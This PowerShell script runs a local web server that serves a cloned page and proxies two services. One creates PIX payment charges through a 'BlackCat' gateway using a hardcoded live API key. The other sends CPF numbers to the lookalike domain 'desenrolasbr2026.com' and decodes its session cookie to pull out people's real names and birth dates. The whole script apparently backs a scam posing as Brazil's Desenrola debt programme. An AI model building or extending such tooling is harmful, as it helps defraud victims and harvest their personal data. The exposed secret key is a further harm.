Add-Type -AssemblyName System.Web

$ROOT   = "C:\Users\khsx2\Downloads\desenrola_extraido"
$PORT   = 8080

$BLACKCAT_KEY  = "sk_live_2869f98ba05e8789e923dcc8a1784be7d3adca5d45a09ed01bcf5dcef046d0b8"
$BLACKCAT_BASE = "https://api.blackcatoficial.com/api"
$CPF_API_BASE  = "https://consulta.desenrolasbr2026.com"

function Get-MimeType([string]$ext) {
    $m = @{
        ".html"=  "text/html;charset=utf-8"
        ".css"=   "text/css"
        ".js"=    "application/javascript"
        ".json"=  "application/json"
        ".png"=   "image/png"
        ".jpg"=   "image/jpeg"
        ".jpeg"=  "image/jpeg"
        ".webp"=  "image/webp"
        ".gif"=   "image/gif"
        ".svg"=   "image/svg+xml"
        ".ico"=   "image/x-icon"
        ".mp3"=   "audio/mpeg"
        ".mp4"=   "video/mp4"
        ".woff"=  "font/woff"
        ".woff2"= "font/woff2"
        ".ttf"=   "font/ttf"
    }
    if ($m[$ext]) { return $m[$ext] }; "application/octet-stream"
}

function Write-Ok([System.Net.HttpListenerContext]$ctx, [int]$code, [string]$ct, [byte[]]$data) {
    $r = $ctx.Response
    $r.StatusCode = $code
    $r.ContentType = $ct
    $r.Headers.Set("Access-Control-Allow-Origin","*")
    $r.Headers.Set("Access-Control-Allow-Headers","Content-Type,X-API-Key")
    if ($data -and $data.Length -gt 0) {
        $r.ContentLength64 = $data.Length
        $r.OutputStream.Write($data,0,$data.Length)
    } else {
        $r.ContentLength64 = 0
    }
    $r.Close()
}

function Write-Json([System.Net.HttpListenerContext]$ctx, [int]$code, [string]$json) {
    Write-Ok $ctx $code "application/json" ([System.Text.Encoding]::UTF8.GetBytes($json))
}

function Serve-Static([System.Net.HttpListenerContext]$ctx, [string]$url) {
    $rel = $url.TrimStart('/') -replace '/','\'
    $candidates = @(
        (Join-Path $ROOT $rel),
        (Join-Path (Join-Path $ROOT "facebook") $rel),
        (Join-Path $ROOT ($rel + "\index.html")),
        (Join-Path (Join-Path $ROOT "facebook") ($rel + "\index.html"))
    )
    if ($url -eq "/" -or $url -eq "") {
        $candidates = @((Join-Path $ROOT "facebook\index.html")) + $candidates
    }

    $found = $null
    foreach ($c in $candidates) { if (Test-Path $c -PathType Leaf) { $found = $c; break } }

    if (-not $found) {
        Write-Ok $ctx 404 "text/plain" ([System.Text.Encoding]::UTF8.GetBytes("404: $url"))
        Write-Host "  404 $url" -ForegroundColor DarkRed
        return
    }

    $ext  = [System.IO.Path]::GetExtension($found).ToLower()
    $mime = Get-MimeType $ext
    $fileLen = (Get-Item $found).Length

    $rangeHdr = $ctx.Request.Headers["Range"]
    if ($rangeHdr -and $rangeHdr -match "bytes=(\d*)-(\d*)") {
        $s = if ($matches[1]) { [long]$matches[1] } else { 0 }
        $e = if ($matches[2]) { [long]$matches[2] } else { $fileLen - 1 }
        if ($e -ge $fileLen) { $e = $fileLen - 1 }
        $len = $e - $s + 1
        $ctx.Response.StatusCode = 206
        $ctx.Response.ContentType = $mime
        $ctx.Response.Headers.Set("Access-Control-Allow-Origin","*")
        $ctx.Response.Headers.Set("Content-Range","bytes $s-$e/$fileLen")
        $ctx.Response.Headers.Set("Accept-Ranges","bytes")
        $ctx.Response.ContentLength64 = $len
        $fs = [System.IO.File]::OpenRead($found)
        $fs.Seek($s,'Begin') | Out-Null
        $buf = [byte[]]::new([Math]::Min($len,65536))
        $rem = $len
        while ($rem -gt 0) {
            $n = [Math]::Min($rem,$buf.Length)
            $r = $fs.Read($buf,0,$n)
            if ($r -le 0) { break }
            $ctx.Response.OutputStream.Write($buf,0,$r)
            $rem -= $r
        }
        $fs.Close()
        $ctx.Response.Close()
        Write-Host "  206 $url [$s-$e]" -ForegroundColor DarkGray
        return
    }

    $bytes = [System.IO.File]::ReadAllBytes($found)
    $ctx.Response.Headers.Set("Cache-Control", $(if ($ext -eq ".html") { "no-store" } else { "max-age=3600" }))
    $ctx.Response.Headers.Set("Accept-Ranges","bytes")
    Write-Ok $ctx 200 $mime $bytes
    Write-Host "  200 $url ($($bytes.Length) bytes)" -ForegroundColor DarkGray
}

# Decodifica o cookie de sessao Flask e retorna o objeto JSON
function Decode-FlaskSession([string]$cookie) {
    try {
        $raw    = $cookie.TrimStart('.')
        $b64    = $raw.Split('.')[0]
        $b64    = $b64 -replace '-','+' -replace '_','/'
        while ($b64.Length % 4 -ne 0) { $b64 += '=' }
        $bytes  = [Convert]::FromBase64String($b64)
        # Pular 2 bytes do header zlib (0x78 0x9C)
        $ms     = New-Object System.IO.MemoryStream(,$bytes[2..($bytes.Length-1)])
        $def    = New-Object System.IO.Compression.DeflateStream($ms,[System.IO.Compression.CompressionMode]::Decompress)
        $rdr    = New-Object System.IO.StreamReader($def,[System.Text.Encoding]::UTF8)
        return  $rdr.ReadToEnd() | ConvertFrom-Json
    } catch { return $null }
}

$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add("http://localhost:$PORT/")
$listener.Start()

Write-Host "========================================" -ForegroundColor Green
Write-Host "  Servidor no ar: http://localhost:$PORT" -ForegroundColor Green
Write-Host "  BlackCat PIX: ATIVO" -ForegroundColor Cyan
Write-Host "  Ctrl+C para parar" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Green

while ($listener.IsListening) {
    $ctx = $null
    try { $ctx = $listener.GetContext() } catch { break }
    $url    = $ctx.Request.Url.AbsolutePath
    $method = $ctx.Request.HttpMethod
    Write-Host "$method $url" -ForegroundColor DarkGray

    # OPTIONS
    if ($method -eq "OPTIONS") {
        Write-Ok $ctx 204 "text/plain" @()
        continue
    }

    # BlackCat: Criar PIX
    if ($url -eq "/proxy/blackcat/create") {
        try {
            $rdr  = [System.IO.StreamReader]::new($ctx.Request.InputStream,[System.Text.Encoding]::UTF8)
            $body = $rdr.ReadToEnd(); $rdr.Close()
            $inp  = $body | ConvertFrom-Json

            $amount   = if ($inp.payment_amount) { [int]$inp.payment_amount } else { 6892 }
            $nomePix  = if ($inp.customer.name)   { $inp.customer.name }   else { "Cliente" }
            $email    = if ($inp.customer.email)  { $inp.customer.email }  else { "cliente@gmail.com" }
            $phone    = [regex]::Replace($(if ($inp.customer.phone) { $inp.customer.phone } else { "11999999999" }),'\D','')
            $cpfNum   = [regex]::Replace($(if ($inp.customer.document) { "$($inp.customer.document)" } else { "00000000000" }),'\D','')
            $extCode  = if ($inp.external_code) { $inp.external_code } else { "DR-$(Get-Date -UFormat '%s')" }
            $prodName = if ($inp.items -and $inp.items[0].name) { $inp.items[0].name } else { "Pagamento Seguro" }

            $payload = @{
                amount        = $amount
                currency      = "BRL"
                paymentMethod = "pix"
                items         = @(@{ title=$prodName; quantity=1; tangible=$false })
                customer      = @{
                    name     = $nomePix
                    email    = $email
                    phone    = $phone
                    document = @{ number=$cpfNum; type="cpf" }
                }
                pix         = @{ expiresInDays=1 }
                externalRef = $extCode
            } | ConvertTo-Json -Depth 10

            $hdrs = @{ "Content-Type"="application/json"; "X-API-Key"=$BLACKCAT_KEY }
            $resp = Invoke-RestMethod -Uri "$BLACKCAT_BASE/sales/create-sale" -Method POST -Headers $hdrs -Body $payload -ContentType "application/json" -ErrorAction Stop

            $pixCode = $resp.data.paymentData.copyPaste
            $txId    = $resp.data.transactionId
            Write-Host "  [PIX CREATE] OK TXN=$txId" -ForegroundColor Green

            $safePixCode = $pixCode -replace '"','\"'
            $out = "{""success"":true,""data"":{""transactionId"":""$txId"",""status"":""PENDING"",""paymentData"":{""copyPaste"":""$safePixCode"",""qrCode"":""$safePixCode""}}}"
            Write-Json $ctx 200 $out
        } catch {
            $msg = $_.Exception.Message -replace '"','\"'
            Write-Host "  [PIX CREATE] ERRO: $($_.Exception.Message)" -ForegroundColor Red
            Write-Json $ctx 500 "{""success"":false,""message"":""$msg""}"
        }
        continue
    }

    # BlackCat: Status
    if ($url -match "^/proxy/blackcat/status/(.+)$") {
        $txId = $matches[1]
        try {
            $hdrs = @{ "X-API-Key"=$BLACKCAT_KEY }
            $resp = Invoke-RestMethod -Uri "$BLACKCAT_BASE/sales/$txId/status" -Method GET -Headers $hdrs -ErrorAction Stop
            $status = $resp.data.status
            Write-Host "  [PIX STATUS] TXN=$txId -> $status" -ForegroundColor Cyan
            Write-Json $ctx 200 "{""success"":true,""data"":{""transactionId"":""$txId"",""status"":""$status""}}"
        } catch {
            $msg = $_.Exception.Message -replace '"','\"'
            Write-Host "  [PIX STATUS] ERRO: $($_.Exception.Message)" -ForegroundColor Red
            Write-Json $ctx 500 "{""success"":false,""message"":""$msg""}"
        }
        continue
    }

    # Proxy CPF — consulta https://consulta.desenrolasbr2026.com e extrai nome do cookie Flask
    if ($url -match "^/(facebook/)?api-cpf\.php") {
        $cpf     = $ctx.Request.QueryString["cpf"] -replace '\D',''
        $nome    = ""
        $nasc    = ""
        $success = "false"

        try {
            $cpfBody = "{""cpf"":""$cpf""}"
            $tmpIn   = "$env:TEMP\cpf_req_$cpf.json"
            $tmpHdr  = "$env:TEMP\cpf_hdr_$cpf.txt"
            $cpfBody | Out-File $tmpIn -Encoding utf8 -NoNewline

            # POST identico ao que o navegador faz, capturando o Set-Cookie
            $resp = curl.exe -s -X POST `
                -H "Content-Type: application/json" `
                -H "Accept: application/json, text/plain, */*" `
                -H "Accept-Language: pt-BR,pt;q=0.9" `
                -H "Origin: https://consulta.desenrolasbr2026.com" `
                -H "Referer: https://consulta.desenrolasbr2026.com/cpf" `
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" `
                --data-binary "@$tmpIn" `
                -D "$tmpHdr" `
                --max-time 10 `
                "https://consulta.desenrolasbr2026.com/api/check_cpf"

            $apiJson = $resp | ConvertFrom-Json -ErrorAction SilentlyContinue

            if ($apiJson -and $apiJson.success -eq $true) {
                $success = "true"

                # Decodificar cookie Flask para extrair o nome real
                $hdrsRaw     = Get-Content $tmpHdr -Raw -ErrorAction SilentlyContinue
                $cookieMatch = [regex]::Match($hdrsRaw, 'session=([^;\r\n]+)')
                if ($cookieMatch.Success) {
                    $sessObj = Decode-FlaskSession $cookieMatch.Groups[1].Value
                    if ($sessObj) {
                        if ($sessObj.customer_data) {
                            $nome = if ($sessObj.customer_data.nome) { [string]$sessObj.customer_data.nome } else { "" }
                            $nasc = if ($sessObj.customer_data.data_nascimento) { [string]$sessObj.customer_data.data_nascimento } else { "" }
                        } elseif ($sessObj.nome) {
                            $nome = [string]$sessObj.nome
                        }
                        Write-Host "  [CPF] Cookie decodificado: nome='$nome'" -ForegroundColor Green
                    }
                }
            }
        } catch {
            Write-Host "  [CPF] Erro API: $($_.Exception.Message)" -ForegroundColor DarkYellow
        }

        # Fallback: valida matematicamente se API falhou
        if ($success -eq "false") {
            $c = $cpf
            $ok = $false
            if ($c.Length -eq 11 -and $c -notmatch '^(.)\1+$') {
                $s1=0; for($i=0;$i-lt9;$i++){$s1+=[int]::Parse($c[$i])*(10-$i)}
                $d1=if(($s1%11)-lt2){0}else{11-($s1%11)}
                $s2=0; for($i=0;$i-lt10;$i++){$s2+=[int]::Parse($c[$i])*(11-$i)}
                $d2=if(($s2%11)-lt2){0}else{11-($s2%11)}
                $ok = ([int]::Parse($c[9]) -eq $d1) -and ([int]::Parse($c[10]) -eq $d2)
            }
            if ($ok) {
                $success = "true"
                Write-Host "  [CPF] $cpf -> valido matematicamente (API indisponivel)" -ForegroundColor Yellow
            } else {
                Write-Host "  [CPF] $cpf -> invalido (API+math)" -ForegroundColor Red
            }
        } else {
            Write-Host "  [CPF] $cpf -> nome='$nome' success=$success" -ForegroundColor Cyan
        }

        $nome = $nome.Trim() -replace '"','\"'
        $nasc = $nasc.Trim() -replace '"','\"'
        Write-Json $ctx 200 "{""success"":$success,""nome"":""$nome"",""name"":""$nome"",""nomeCompleto"":""$nome"",""nascimento"":""$nasc""}"
        continue
    }

    # Arquivos estaticos
    Serve-Static $ctx $url
}
